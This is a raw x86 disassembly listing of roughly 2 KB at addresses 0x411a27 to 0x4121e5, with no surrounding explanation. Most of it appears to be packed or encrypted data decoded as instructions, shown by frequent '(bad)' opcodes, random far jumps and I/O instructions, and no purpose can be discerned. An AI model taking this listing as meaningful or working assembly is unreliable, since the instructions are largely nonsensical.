  411a27:	pop    ecx
  411a28:	push   0x4
  411a2a:	pop    ebx
  411a2b:	inc    ebx
  411a2c:	jmp    0x411e20
  411a31:	inc    ebp
  411a32:	or     DWORD PTR [edi+0x55d349c7],0xffffff81
  411a39:	push   esi
  411a3a:	ds sbb eax,0x9a27cb7d
  411a40:	sbb    al,0xc7
  411a42:	dec    esp
  411a43:	jo     0x411ab5
  411a45:	dec    ecx
  411a46:	jge    0x411ab8
  411a48:	jo     0x411a7f
  411a4a:	shr    DWORD PTR [esp+eax*2+0x24dbaec0],1
  411a51:	pop    ecx
  411a52:	mov    dl,0xb1
  411a54:	pop    esp
  411a55:	test   bh,0xda
  411a58:	jmp    0x6de8:0x732cf32c
  411a5f:	inc    edi
  411a60:	not    dh
  411a62:	xchg   ecx,eax
  411a63:	xor    eax,0xc1e14358
  411a68:	ins    DWORD PTR es:[edi],dx
  411a69:	sub    dl,BYTE PTR [esi-0xf]
  411a6c:	pop    edx
  411a6d:	clc    
  411a6e:	retf   0x74c5
  411a71:	xor    al,BYTE PTR [ebx]
  411a73:	mov    dl,0x94
  411a75:	pusha  
  411a76:	cs iret 
  411a78:	adc    cl,BYTE PTR [eax+ecx*8+0x5a]
  411a7c:	stc    
  411a7d:	add    eax,0x757b3140
  411a82:	cwde   
  411a83:	cli    
  411a84:	pop    ebp
  411a85:	das    
  411a86:	out    0xcd,al
  411a88:	shr    DWORD PTR [eax+esi*4-0xa16857d],0x51
  411a90:	xchg   dh,al
  411a92:	xor    eax,0xbb42aee3
  411a97:	mov    eax,0x707afba0
  411a9c:	imul   edx,DWORD PTR [eax],0xffffffdf
  411a9f:	das    
  411aa0:	cli    
  411aa1:	fcom   QWORD PTR [eax-0x7a]
  411aa4:	xchg   BYTE PTR [edx+edi*4+0x21],cl
  411aa8:	inc    edx
  411aa9:	out    0xc6,eax
  411aab:	adc    al,0xb2
  411aad:	pop    ebx
  411aae:	dec    ebx
  411aaf:	int    0x8
  411ab1:	adc    DWORD PTR [edx-0x3],esp
  411ab4:	loop   0x411a86
  411ab6:	jmp    0xcf23a6d1
  411abb:	xor    eax,0xf129aed
  411ac0:	jae    0x411af9
  411ac2:	jae    0x411b28
  411ac4:	das    
  411ac5:	mov    esp,0xbb08d005
  411aca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411acb:	sti    
  411acc:	push   esp
  411acd:	sbb    DWORD PTR [eax+0x5c207e95],edi
  411ad3:	xchg   ebp,eax
  411ad4:	mov    bl,0x3f
  411ad6:	pop    edi
  411ad7:	call   0xea37:0x2fa0fd9a
  411ade:	or     cl,bh
  411ae0:	xor    edx,ecx
  411ae2:	xor    eax,0x3e00103a
  411ae7:	jmp    0xe3b8:0xae80149f
  411aee:	clc    
  411aef:	xor    ebp,DWORD PTR [esi-0x27]
  411af2:	stos   BYTE PTR es:[edi],al
  411af3:	clc    
  411af4:	ins    DWORD PTR es:[edi],dx
  411af5:	sbb    ebp,esi
  411af7:	scas   eax,DWORD PTR es:[edi]
  411af8:	xchg   ecx,eax
  411af9:	pop    ds
  411afa:	jp     0x411b41
  411afc:	scas   al,BYTE PTR es:[edi]
  411afd:	jle    0x411abe
  411aff:	push   esp
  411b00:	mov    cl,BYTE PTR [ebx+edi*4-0x6998fd27]
  411b07:	dec    eax
  411b08:	dec    edx
  411b09:	xlat   BYTE PTR ds:[ebx]
  411b0a:	fsub   QWORD PTR [ebx+0x88f7902]
  411b10:	dec    esp
  411b11:	mov    fs,WORD PTR [ecx+0x59]
  411b14:	loopne 0x411ab8
  411b16:	stc    
  411b17:	out    0xb3,al
  411b19:	cmp    cl,cl
  411b1b:	jp     0x411b6e
  411b1d:	mov    cl,0x30
  411b1f:	(bad)  
  411b21:	adc    BYTE PTR [ebx+0x30],bh
  411b24:	mov    dh,0x27
  411b26:	jge    0x411b19
  411b28:	daa    
  411b29:	pop    eax
  411b2a:	jnp    0x411af4
  411b2c:	pop    eax
  411b2d:	fist   WORD PTR [ebp-0x649810e3]
  411b33:	addr16 push esp
  411b35:	in     al,dx
  411b36:	jl     0x411bae
  411b38:	inc    ebx
  411b39:	pop    ss
  411b3a:	pop    ecx
  411b3b:	adc    BYTE PTR [edi],dl
  411b3d:	(bad)  
  411b3e:	xor    ebp,DWORD PTR [esi+0x7be74faa]
  411b44:	fisttp DWORD PTR [esi]
  411b46:	pop    ebx
  411b47:	in     al,0x32
  411b49:	ret    0xa049
  411b4c:	lods   al,BYTE PTR ds:[esi]
  411b4d:	ins    DWORD PTR es:[edi],dx
  411b4e:	outs   dx,DWORD PTR ds:[esi]
  411b4f:	and    eax,0xfd6dddfd
  411b54:	mov    dl,0x5b
  411b56:	(bad)  
  411b57:	fisttp QWORD PTR [ebp+0x40]
  411b5a:	mov    ah,0x30
  411b5c:	mov    edi,0xa4828a16
  411b61:	sbb    DWORD PTR [ebx-0x15],eax
  411b64:	sti    
  411b65:	jb     0x411b1c
  411b67:	lahf   
  411b68:	into   
  411b69:	ds sar eax,1
  411b6c:	jge    0x411b05
  411b6e:	enter  0xe0ef,0xaa
  411b72:	in     eax,dx
  411b73:	ins    DWORD PTR es:[edi],dx
  411b74:	inc    ebp
  411b75:	pop    eax
  411b76:	jp     0x411af9
  411b78:	add    al,BYTE PTR [ecx]
  411b7a:	out    dx,al
  411b7b:	repz not DWORD PTR [edi+0x58e86cb1]
  411b82:	pop    es
  411b83:	push   ss
  411b84:	out    dx,eax
  411b85:	mov    ds:0x7d889a0,eax
  411b8a:	mov    eax,0x3242b8b3
  411b8f:	out    dx,al
  411b90:	test   DWORD PTR [ebp+0x2],esi
  411b93:	call   0x907a20c1
  411b98:	enter  0x854e,0xea
  411b9c:	fbld   TBYTE PTR [edx]
  411b9e:	add    DWORD PTR [eax-0x20],eax
  411ba1:	popf   
  411ba2:	push   ebp
  411ba3:	iret   
  411ba4:	ret    
  411ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ba6:	nop
  411ba7:	mov    al,ds:0x8e6a2518
  411bac:	push   0x35
  411bae:	and    bl,BYTE PTR [ebx-0xdfc771c]
  411bb4:	push   eax
  411bb5:	cmp    DWORD PTR [edi],eax
  411bb7:	test   eax,0xa908e992
  411bbc:	fs inc ecx
  411bbe:	pop    es
  411bbf:	sbb    ecx,DWORD PTR [esi+ebp*2-0x44]
  411bc3:	(bad)
  411bc7:	fcom   DWORD PTR [eax+0x6b3dc915]
  411bcd:	ret    0x363f
  411bd0:	add    BYTE PTR [ecx-0x7bcf7438],bh
  411bd6:	inc    eax
  411bd7:	lea    edi,[esi-0x21]
  411bda:	mov    DWORD PTR [ecx+esi*8+0x3f],edx
  411bde:	mov    ebx,0xe1f26407
  411be3:	jb     0x411b92
  411be5:	popf   
  411be6:	mov    eax,0xc6114c91
  411beb:	rol    DWORD PTR [ecx-0x770664af],0x74
  411bf2:	pop    ebx
  411bf3:	sar    DWORD PTR [eax+0x78],0xfd
  411bf7:	push   esp
  411bf8:	inc    BYTE PTR [edi+0x51]
  411bfb:	dec    ecx
  411bfc:	and    DWORD PTR [ecx-0x7647cc24],ebp
  411c02:	inc    esp
  411c03:	std    
  411c04:	mov    ch,0x9a
  411c06:	mov    ds:0x8856476a,al
  411c0b:	addr16 je 0x411be3
  411c0e:	pop    es
  411c0f:	mov    bh,0xde
  411c11:	push   es
  411c12:	jg     0x411bcd
  411c14:	cmp    ebx,edi
  411c16:	retf   
  411c17:	sbb    dl,BYTE PTR [esi]
  411c19:	cdq    
  411c1a:	imul   al
  411c1c:	sti    
  411c1d:	inc    edi
  411c1e:	push   edx
  411c1f:	int    0x1b
  411c21:	pop    edi
  411c22:	mov    ch,0xd1
  411c24:	or     edx,eax
  411c26:	xor    BYTE PTR [ecx],ah
  411c28:	clc    
  411c29:	inc    esi
  411c2a:	fdiv   QWORD PTR [esi-0x7]
  411c2d:	xchg   edi,eax
  411c2e:	push   esi
  411c2f:	add    eax,0xfeba564
  411c34:	rol    DWORD PTR [eax-0x67],0xee
  411c38:	sub    DWORD PTR [eax],edx
  411c3a:	out    dx,eax
  411c3b:	ror    esp,1
  411c3d:	ds loopne 0x411cac
  411c40:	or     eax,0x47626d07
  411c45:	mov    eax,ds:0xc38c4f11
  411c4a:	jo     0x411c86
  411c4c:	jno    0x411bdc
  411c4e:	push   0xefff508b
  411c53:	xor    eax,0xc4e0758b
  411c58:	dec    ecx
  411c59:	retf   
  411c5a:	out    dx,al
  411c5b:	clc    
  411c5c:	popf   
  411c5d:	sti    
  411c5e:	adc    al,0x60
  411c60:	mov    al,ds:0x347a9bc4
  411c65:	inc    ebp
  411c66:	adc    edi,esi
  411c68:	jo     0x411c57
  411c6a:	jge    0x411c07
  411c6c:	jb     0x411ccb
  411c6e:	xor    dh,BYTE PTR [eax]
  411c70:	sbb    eax,0x9879b8c1
  411c75:	pop    es
  411c76:	adc    cl,BYTE PTR [ebp-0x7ad5b03c]
  411c7c:	loopne 0x411cae
  411c7e:	cmp    dl,BYTE PTR [edi-0x3aa4d131]
  411c84:	(bad)  [edx-0xc868f27]
  411c8a:	js     0x411c69
  411c8c:	je     0x411c0e
  411c8e:	loope  0x411c6a
  411c90:	mov    DWORD PTR [eax+0x5d],eax
  411c93:	sub    BYTE PTR [edx+eax*4],al
  411c96:	scas   al,BYTE PTR es:[edi]
  411c97:	cdq    
  411c98:	fsubr  st,st(7)
  411c9a:	ds sub al,0xeb
  411c9d:	inc    edx
  411c9e:	int    0x7
  411ca0:	jp     0x411cb0
  411ca2:	sbb    eax,edx
  411ca4:	lds    esi,FWORD PTR [eax+eax*2]
  411ca7:	popa   
  411ca8:	ins    BYTE PTR es:[edi],dx
  411ca9:	xchg   BYTE PTR [edi-0x1437b5c5],ah
  411caf:	jl     0x411c3b
  411cb1:	dec    esi
  411cb2:	and    ecx,ebp
  411cb4:	das    
  411cb5:	les    esi,FWORD PTR [edi]
  411cb7:	daa    
  411cb8:	ret    0x80f3
  411cbb:	mov    BYTE PTR [ebx+0x4760e9fe],ch
  411cc1:	cdq    
  411cc2:	cmp    DWORD PTR [ebx-0x3f],ebx
  411cc5:	aam    0x50
  411cc7:	rcr    ebx,0x3b
  411cca:	out    0x69,eax
  411ccc:	jl     0x411c6f
  411cce:	xor    dh,BYTE PTR [eax+edx*4-0x9610203]
  411cd5:	dec    ecx
  411cd6:	and    ah,BYTE PTR [edx]
  411cd8:	xchg   BYTE PTR [esi+ebp*8-0x41],cl
  411cdc:	jmp    0x411ca8
  411cde:	mov    bl,BYTE PTR [eax+0x2f9fe43a]
  411ce4:	ret    
  411ce5:	cmp    eax,DWORD PTR [eax+0x32abb655]
  411ceb:	jle    0x411ca2
  411ced:	xchg   esp,eax
  411cee:	sbb    eax,0xf5d8844a
  411cf3:	rol    ah,cl
  411cf5:	ss jl  0x411d5e
  411cf8:	jecxz  0x411d72
  411cfa:	repnz dec esp
  411cfc:	pop    esp
  411cfd:	dec    esp
  411cfe:	out    0x8a,eax
  411d00:	cmp    BYTE PTR [ebp+0x52],bl
  411d03:	das    
  411d04:	aam    0x7a
  411d06:	xor    DWORD PTR [edi-0x45a03c8a],esi
  411d0c:	(bad)  
  411d0d:	sbb    al,cl
  411d0f:	pop    edi
  411d10:	rol    DWORD PTR [eax+eiz*2],1
  411d13:	in     al,0xce
  411d15:	push   ds
  411d16:	ins    DWORD PTR es:[edi],dx
  411d17:	(bad)  
  411d18:	sahf   
  411d19:	sar    BYTE PTR [edx+esi*2],0x7
  411d1d:	jmp    0x8b10:0xb09a9baa
  411d24:	or     bl,cl
  411d26:	push   cs
  411d27:	jnp    0x411cfd
  411d29:	int3   
  411d2a:	xchg   DWORD PTR [esi-0x56e301a7],esi
  411d30:	(bad)  
  411d31:	nop
  411d32:	mov    ebp,0xac9c03f0
  411d37:	js     0x411d57
  411d39:	outs   dx,BYTE PTR ds:[esi]
  411d3a:	mov    esi,0x3b542b4d
  411d3f:	mov    bh,0x28
  411d41:	xlat   BYTE PTR ds:[ebx]
  411d42:	xchg   DWORD PTR [ecx+0x69],ebp
  411d45:	adc    dl,BYTE PTR [ebp-0x5d]
  411d48:	add    BYTE PTR [ecx-0x4c424611],0xaf
  411d4f:	jmp    0xa5048c59
  411d54:	mov    ds:0xedf62ed9,al
  411d59:	fmul   DWORD PTR [ebp-0xdbdf349]
  411d5f:	cld    
  411d60:	sbb    al,0x9
  411d62:	out    dx,eax
  411d63:	sub    al,0x73
  411d65:	ror    DWORD PTR ds:0xb7457fd0,0x77
  411d6c:	into   
  411d6d:	call   0xd74b:0x8a8e6a6e
  411d74:	mov    bl,0x16
  411d76:	push   0xffffffcd
  411d78:	popf   
  411d79:	fimul  DWORD PTR [ebx-0x9]
  411d7c:	sub    al,0xe7
  411d7e:	lea    ebp,[ecx+0x4c]
  411d81:	mov    WORD PTR [eax-0x66574288],fs
  411d87:	mov    ds:0xb06f299d,al
  411d8c:	xchg   edi,eax
  411d8d:	cmp    al,0x4b
  411d8f:	fld    DWORD PTR [ecx]
  411d91:	pushf  
  411d92:	add    bh,BYTE PTR [ebx+0x53]
  411d95:	mov    esi,0xe5c16a1
  411d9a:	inc    edi
  411d9b:	add    eax,0x72ebdcb7
  411da0:	dec    edi
  411da1:	sbb    dl,BYTE PTR [edi+0x0]
  411da4:	xchg   edi,eax
  411da5:	mov    ds:0x78a5320a,eax
  411daa:	sbb    dh,0xe4
  411dad:	pop    ds
  411dae:	add    eax,0x2a42f15b
  411db3:	loope  0x411d5f
  411db5:	mov    esp,0x608e15ba
  411dba:	sbb    al,0xa4
  411dbc:	ins    DWORD PTR es:[edi],dx
  411dbd:	jecxz  0x411e04
  411dbf:	ja     0x411e2a
  411dc1:	loope  0x411d83
  411dc3:	les    edx,FWORD PTR cs:[esi+0x2929188]
  411dca:	adc    DWORD PTR [eax],ecx
  411dcc:	dec    ecx
  411dcd:	addr16 pop ebp
  411dcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411dd0:	pop    ecx
  411dd1:	add    eax,0x4ce24657
  411dd6:	mov    bl,0x37
  411dd8:	fsub   DWORD PTR [ebp-0x71]
  411ddb:	adc    ebp,ebp
  411ddd:	rol    dh,0x91
  411de0:	pushf  
  411de1:	add    bh,BYTE PTR [eax+0xd]
  411de4:	bound  edx,QWORD PTR [ebx-0x2c0fb298]
  411dea:	iret   
  411deb:	and    ebx,edi
  411ded:	inc    ecx
  411dee:	scas   eax,DWORD PTR es:[edi]
  411def:	(bad)  
  411df0:	cmp    esi,ecx
  411df2:	(bad)  
  411df3:	fistp  DWORD PTR [edi]
  411df5:	outs   dx,BYTE PTR ds:[esi]
  411df6:	and    ebp,DWORD PTR [esi+0x7c]
  411df9:	xchg   DWORD PTR [edx-0x6a31b9f0],esp
  411dff:	push   cs
  411e00:	les    eax,FWORD PTR cs:[edx+eiz*1+0x59]
  411e05:	or     eax,0xf1efef5
  411e0a:	cmp    ebp,DWORD PTR [edi-0x4fd29222]
  411e10:	div    BYTE PTR [esi-0x10]
  411e13:	aad    0x8a
  411e15:	jnp    0x411e2e
  411e17:	or     eax,0x9ba2707f
  411e1c:	inc    eax
  411e1d:	je     0x411e76
  411e1f:	jge    0x411da8
  411e21:	retf   
  411e22:	sub    ebx,ecx
  411e24:	xchg   ebx,ecx
  411e26:	dec    ecx
  411e27:	mov    eax,DWORD PTR [ebp-0x1c]
  411e2a:	imul   eax,ecx
  411e2d:	add    esp,eax
  411e2f:	xchg   edx,eax
  411e30:	push   eax
  411e31:	xor    ebx,ebx
  411e33:	mov    edx,esp
  411e35:	dec    edx
  411e36:	inc    ebx
  411e37:	add    ebx,DWORD PTR [edx+ebx*1]
  411e3a:	jmp    0x41222e
  411e3f:	jp     0x411dc5
  411e41:	jb     0x411ea0
  411e43:	jb     0x411eb2
  411e45:	adc    DWORD PTR [ebx-0xc],esp
  411e48:	sub    ebp,DWORD PTR [esi]
  411e4a:	cmc    
  411e4b:	cdq    
  411e4c:	lods   eax,DWORD PTR ds:[esi]
  411e4d:	cmp    dh,BYTE PTR [edx]
  411e4f:	adc    BYTE PTR [eax+0x70],cl
  411e52:	jo     0x411e9d
  411e54:	jge    0x411ec6
  411e56:	jo     0x411dfb
  411e58:	sti    
  411e59:	std    
  411e5a:	loopne 0x411e53
  411e5c:	mov    bl,0x26
  411e5e:	push   edx
  411e5f:	cli    
  411e60:	mov    BYTE PTR [ecx-0x2e],bl
  411e63:	jb     0x411dfd
  411e65:	sbb    al,BYTE PTR [ebx-0x3b8fc23e]
  411e6b:	push   esi
  411e6c:	sbb    bl,ah
  411e6e:	adc    dl,BYTE PTR [edx+0x5a6cb1f0]
  411e74:	lods   eax,DWORD PTR ds:[esi]
  411e75:	inc    esi
  411e76:	adc    bh,al
  411e78:	adc    DWORD PTR [edi+eax*2],esi
  411e7b:	jmp    0xf3ae:0x6ae108be
  411e82:	ror    DWORD PTR [esi+0x21],1
  411e85:	add    BYTE PTR [ecx],dh
  411e87:	mov    esp,DWORD PTR [ebx-0x209045a6]
  411e8d:	sbb    ebp,DWORD PTR [edi-0x2e297dd4]
  411e93:	jecxz  0x411edd
  411e95:	xchg   edx,eax
  411e96:	sub    al,0x23
  411e98:	ins    BYTE PTR es:[edi],dx
  411e99:	lods   eax,DWORD PTR ds:[esi]
  411e9a:	jle    0x411ede
  411e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e9d:	loope  0x411e65
  411e9f:	into   
  411ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea1:	lahf   
  411ea2:	push   eax
  411ea3:	xchg   ebx,eax
  411ea4:	cmp    ebp,DWORD PTR [edi+0x58]
  411ea7:	xchg   dh,bh
  411ea9:	(bad)  
  411eaa:	in     eax,0xc6
  411eac:	and    eax,0x3d7e3b15
  411eb1:	xchg   esp,eax
  411eb2:	pop    DWORD PTR es:[eax-0x27ecbd73]
  411eb9:	repz mov bh,0xbb
  411ebc:	sbb    DWORD PTR [esi],esi
  411ebe:	sub    BYTE PTR [edx],bl
  411ec0:	int    0x6c
  411ec2:	jp     0x411f42
  411ec4:	(bad)  
  411ec5:	sub    dh,BYTE PTR [ecx+0x49858cb2]
  411ecb:	dec    ecx
  411ecc:	leave  
  411ecd:	dec    ebp
  411ece:	push   edx
  411ecf:	(bad)  
  411ed0:	(bad)  
  411ed1:	mov    eax,0x7824ca5c
  411ed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ed7:	cmp    dh,BYTE PTR [esi+0x43740363]
  411edd:	out    dx,eax
  411ede:	jp     0x411f11
  411ee0:	lds    ebp,FWORD PTR [esi+0x38]
  411ee3:	mov    ecx,0xc5256ec7
  411ee8:	jmp    0xfd7f367d
  411eed:	cmp    al,0x67
  411eef:	dec    esp
  411ef0:	xchg   BYTE PTR [esi-0x1bc8e3b9],dl
  411ef6:	push   ebx
  411ef7:	xor    edi,DWORD PTR [eax]
  411ef9:	call   0x233d:0x3c76cee3
  411f00:	mov    al,bh
  411f02:	addr16 loop 0x411f69
  411f05:	popa   
  411f06:	loopne 0x411f45
  411f08:	pop    esp
  411f09:	(bad)  
  411f0a:	sbb    eax,DWORD PTR [eax+0x7861f8ed]
  411f10:	test   DWORD PTR [ebx+0x35347e03],ebx
  411f16:	push   edx
  411f17:	jne    0x411ed9
  411f19:	mov    edx,0xcc0f09dc
  411f1e:	sbb    dl,BYTE PTR [ebp-0x74]
  411f21:	add    eax,0xe1b69f3d
  411f26:	or     edi,DWORD PTR [esi+0x35]
  411f29:	jl     0x411f1a
  411f2b:	xlat   BYTE PTR ds:[ebx]
  411f2c:	jbe    0x411ec6
  411f2e:	je     0x411efd
  411f30:	and    ebx,DWORD PTR [edx+0x22d53245]
  411f36:	push   ecx
  411f37:	inc    esi
  411f38:	push   edx
  411f39:	dec    edx
  411f3a:	inc    eax
  411f3b:	rcr    DWORD PTR [edx],cl
  411f3d:	cdq    
  411f3e:	push   eax
  411f3f:	add    eax,0xa3d678fe
  411f44:	js     0x411f54
  411f46:	inc    ecx
  411f47:	xor    BYTE PTR [ebx-0x5a79b527],ah
  411f4d:	jecxz  0x411f18
  411f4f:	or     ebx,DWORD PTR [ecx-0x2443fbec]
  411f55:	loopne 0x411edb
  411f57:	in     al,0xc0
  411f59:	jmp    0xb95e58d1
  411f5e:	sub    edi,DWORD PTR [edi]
  411f60:	mov    ch,0xf1
  411f62:	jae    0x411fb6
  411f64:	out    0x44,eax
  411f66:	xchg   edx,eax
  411f67:	inc    esp
  411f68:	pop    esp
  411f69:	stc    
  411f6a:	pop    ebx
  411f6b:	xchg   esi,eax
  411f6c:	push   edi
  411f6d:	js     0x411faf
  411f6f:	hlt    
  411f70:	mov    ah,0xb1
  411f72:	cli    
  411f73:	sar    al,0x66
  411f76:	mov    gs:0xe4936105,eax
  411f7c:	jns    0x411fb9
  411f7e:	retf   
  411f7f:	sbb    cl,BYTE PTR [ebx-0x18]
  411f82:	cld    
  411f83:	cdq    
  411f84:	inc    esi
  411f85:	mov    ds:0x6d693027,eax
  411f8a:	gs mov ecx,0x5568b9ed
  411f90:	idiv   BYTE PTR [ecx-0x7d5649bb]
  411f96:	(bad)  
  411f97:	sti    
  411f98:	xchg   esp,eax
  411f99:	fsubr  DWORD PTR [edi-0xb0b3d9e]
  411f9f:	sar    BYTE PTR [eax+ebp*1-0x7816eaf2],cl
  411fa6:	and    BYTE PTR [eax+0xd27c5da],0x9b
  411fad:	scas   eax,DWORD PTR es:[edi]
  411fae:	repnz int3 
  411fb0:	ret    0x9374
  411fb3:	test   DWORD PTR [eax+0x79],ecx
  411fb6:	add    DWORD PTR [eax],0x1562ea16
  411fbc:	jecxz  0x412019
  411fbe:	aas    
  411fbf:	push   ebp
  411fc0:	mov    ebp,0x58ff2bd6
  411fc5:	xor    ebx,edi
  411fc7:	jecxz  0x411f7d
  411fc9:	xchg   ebp,eax
  411fca:	cmp    al,0x8a
  411fcc:	(bad)  
  411fcd:	mov    esi,0xee3866fa
  411fd2:	(bad)  
  411fd3:	jle    0x411fae
  411fd5:	xlat   BYTE PTR ds:[ebx]
  411fd6:	pop    ebx
  411fd7:	fistp  WORD PTR [ebp-0x7f2c0891]
  411fdd:	pop    edx
  411fde:	push   ebx
  411fdf:	cmp    BYTE PTR [esi-0x19],bl
  411fe2:	xchg   BYTE PTR [edi+ebx*4-0x2eeededa],al
  411fe9:	pop    ecx
  411fea:	jl     0x41202d
  411fec:	push   0xffffffc5
  411fee:	adc    ecx,ecx
  411ff0:	mov    eax,ds:0xc712240e
  411ff5:	dec    eax
  411ff6:	test   ebp,0x663d07fe
  411ffc:	stc    
  411ffd:	sub    al,0x7a
  411fff:	mov    bh,0x9
  412001:	dec    eax
  412002:	aaa    
  412003:	push   0xffffffd5
  412005:	retf   
  412006:	inc    esp
  412007:	add    esi,ebp
  412009:	scas   eax,DWORD PTR es:[edi]
  41200a:	repnz cmc 
  41200c:	test   ah,dh
  41200e:	inc    esi
  41200f:	and    DWORD PTR [edx],edx
  412011:	sti    
  412012:	imul   esi,DWORD PTR [eax],0x4f
  412015:	js     0x411fe9
  412017:	rcr    cl,cl
  412019:	pop    ds
  41201a:	addr16 mov ecx,0x37c6a463
  412020:	mov    al,ds:0x4f4cbd5b
  412025:	hlt    
  412026:	or     eax,0x6e48db5
  41202b:	(bad)  
  41202c:	and    edi,ebx
  41202e:	xlat   BYTE PTR ds:[ebx]
  41202f:	mov    eax,0xe0b89411
  412034:	stos   DWORD PTR es:[edi],eax
  412035:	out    dx,al
  412036:	das    
  412037:	xchg   DWORD PTR [ebx+ebp*4-0x19ada12],edi
  41203e:	push   ecx
  41203f:	push   0xf7c8df35
  412044:	jno    0x411fe4
  412046:	imul   esi,DWORD PTR [ebp+0x36258f0c],0xffffff8e
  41204d:	mov    ebx,0xcd78d5be
  412052:	jbe    0x41206a
  412054:	dec    edi
  412055:	mov    eax,0x20768419
  41205a:	and    BYTE PTR [edi+0x63e71a0e],cl
  412060:	inc    esp
  412061:	lods   al,BYTE PTR ds:[esi]
  412062:	dec    esp
  412063:	and    BYTE PTR [eax],ah
  412065:	push   esp
  412066:	fisub  WORD PTR [edi+0x3fb79173]
  41206c:	adc    BYTE PTR [edx-0x50f7ae14],ah
  412072:	int3   
  412073:	mov    ds:0x566233c6,eax
  412078:	and    al,0xd8
  41207a:	data16 jbe 0x412041
  41207d:	sub    eax,0x6f745271
  412082:	sub    edi,ecx
  412084:	and    BYTE PTR [edx],0x62
  412087:	popf   
  412088:	js     0x41203f
  41208a:	jp     0x4120f1
  41208c:	jo     0x412066
  41208e:	xor    eax,0x31685301
  412093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412094:	test   DWORD PTR [esi],0xa6189c16
  41209a:	xchg   DWORD PTR [edi],ecx
  41209c:	les    ebp,FWORD PTR [edi+0x5c884129]
  4120a2:	(bad)  
  4120a3:	hlt    
  4120a4:	inc    edx
  4120a5:	adc    esi,DWORD PTR [ebx+0x6797ae21]
  4120ab:	cli    
  4120ac:	mov    edx,0x3c6cf3dd
  4120b1:	pop    ss
  4120b2:	stos   DWORD PTR es:[edi],eax
  4120b3:	dec    edi
  4120b4:	add    esi,DWORD PTR [edx-0x73]
  4120b7:	dec    ebx
  4120b8:	cs pop eax
  4120ba:	out    0xc2,al
  4120bc:	in     al,dx
  4120bd:	cmp    dh,ah
  4120bf:	mov    ?,WORD PTR [edx-0x873e6ff]
  4120c5:	shl    DWORD PTR [ebp-0x43fe10f1],0xed
  4120cc:	add    ebx,DWORD PTR [eax+0x6f71f283]
  4120d2:	repnz adc BYTE PTR [bp-0x22b6],cl
  4120d8:	cmp    esp,eax
  4120da:	fstp   QWORD PTR [esi]
  4120dc:	daa    
  4120dd:	loop   0x41213e
  4120df:	in     eax,dx
  4120e0:	int    0x3b
  4120e2:	out    0x51,eax
  4120e4:	add    eax,0x6adc1aee
  4120e9:	dec    eax
  4120ea:	ja     0x4120b5
  4120ec:	lahf   
  4120ed:	pop    esp
  4120ee:	faddp  st(1),st
  4120f0:	cmp    DWORD PTR [ebp-0x1cf91685],esp
  4120f6:	mov    ds:0x465573d2,al
  4120fb:	cmp    BYTE PTR [esi],0x7a
  4120fe:	test   DWORD PTR ss:[edx+0x7f],0x72bbc227
  412106:	jge    0x4120c2
  412108:	xchg   ebp,eax
  412109:	fnstcw WORD PTR [eax+0x5b6053c0]
  41210f:	push   ebx
  412110:	sahf   
  412111:	jo     0x41212b
  412113:	inc    esi
  412114:	test   al,0x46
  412116:	adc    dh,BYTE PTR [esi]
  412118:	(bad)  
  412119:	and    DWORD PTR [edi],esi
  41211b:	retf   0x74bc
  41211e:	inc    edx
  41211f:	cmp    ebx,ebx
  412121:	(bad)  
  412122:	imul   ebx,eax,0x77
  412125:	pop    es
  412126:	mov    edx,0xc22f9215
  41212b:	cs test edx,edx
  41212e:	add    BYTE PTR [eax-0x119973dc],al
  412134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412135:	retf   
  412136:	xchg   ecx,eax
  412137:	and    dh,BYTE PTR [eax]
  412139:	mov    dl,0x1b
  41213b:	into   
  41213c:	aaa    
  41213d:	idiv   DWORD PTR [ebx+0x776e4dd7]
  412143:	xor    DWORD PTR [edx],ebp
  412145:	out    dx,eax
  412146:	inc    edx
  412147:	mov    ah,0x11
  412149:	repz ficomp DWORD PTR ds:0xcf6d3646
  412150:	cmp    ch,BYTE PTR [edi+ebp*2]
  412153:	(bad)  
  412154:	test   BYTE PTR [eax],0x9b
  412157:	dec    edx
  412158:	pop    ds
  412159:	(bad)  
  41215a:	push   ecx
  41215b:	sti    
  41215c:	call   0xf9f1:0x4efcccaa
  412163:	xchg   edi,eax
  412164:	mov    BYTE PTR [ebx],ah
  412166:	pop    edx
  412167:	mov    ds:0x729fbe2d,eax
  41216c:	popf   
  41216d:	sbb    DWORD PTR ds:0xaaa786f8,esi
  412173:	push   ecx
  412174:	aas    
  412175:	mov    ?,WORD PTR [eax]
  412177:	dec    esi
  412178:	out    0x2c,eax
  41217a:	jmp    0xd57b:0xc1070986
  412181:	add    al,0x4f
  412183:	add    al,0xfc
  412185:	inc    ebx
  412186:	fwait
  412187:	or     ecx,edi
  412189:	stc    
  41218a:	dec    eax
  41218b:	hlt    
  41218c:	(bad)  
  41218d:	cmc    
  41218e:	retf   
  41218f:	sbb    dh,BYTE PTR [edx+ebp*1-0x1]
  412193:	mov    WORD PTR [ecx],?
  412195:	lods   al,BYTE PTR ds:[esi]
  412196:	pusha  
  412197:	test   eax,0x651083ac
  41219c:	les    ebp,FWORD PTR [ebx+edx*1]
  41219f:	aam    0xf1
  4121a1:	jae    0x412154
  4121a3:	mul    dh
  4121a5:	sbb    eax,0xb4635170
  4121aa:	bound  edi,QWORD PTR [edi]
  4121ac:	ins    BYTE PTR es:[edi],dx
  4121ad:	test   dl,ah
  4121af:	jge    0x41217c
  4121b1:	push   edx
  4121b2:	test   BYTE PTR [edi],0xae
  4121b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121b6:	pushf  
  4121b7:	sub    dl,BYTE PTR [ecx+0x23c1ee8a]
  4121bd:	lock sbb DWORD PTR [ebp+0x45399502],eax
  4121c4:	and    DWORD PTR [edi-0x6],ebp
  4121c7:	fstp   DWORD PTR [ecx+ebp*8-0x30d310e]
  4121ce:	pop    edx
  4121cf:	enter  0xae6f,0xba
  4121d3:	outs   dx,DWORD PTR ds:[esi]
  4121d4:	aam    0x2c
  4121d6:	lahf   
  4121d7:	test   BYTE PTR [ebx+0x66],dh
  4121da:	mov    ds:0xe7c94727,eax
  4121df:	cld    
  4121e0:	mov    ds:0x66233033,al
  4121e5:	pop    ebx
